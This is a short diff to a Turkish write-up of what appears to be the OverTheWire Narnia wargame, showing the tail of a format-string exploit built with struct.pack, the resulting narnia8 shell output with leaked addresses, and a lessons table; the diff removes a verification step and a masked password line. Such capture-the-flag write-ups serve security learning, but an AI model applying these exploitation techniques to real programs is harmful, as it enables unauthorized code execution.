@@ -61,8 +61,6 @@ exploit = struct.pack('<I',ptrf) + fmt
 ```
 Çıktı: `Way to go!!!!` → `uid=14008(narnia8)` → şifre. (Canlı: `GF=80492ea HF=804930f lh=930f PTRF=ffffd318`.)
 
-## 6. Doğrulama
-`uid=14008(narnia8)` ✅
 
 ## Dersler
 | Konu | Not |
@@ -73,4 +71,3 @@ exploit = struct.pack('<I',ptrf) + fmt
 | adresler hediye | GF/HF/&ptrf basılıyor → tahmin yok |
 | `sleep(2)` | komutu yeterince geç besle |
 
-**narnia8 şifresi: `**********`**
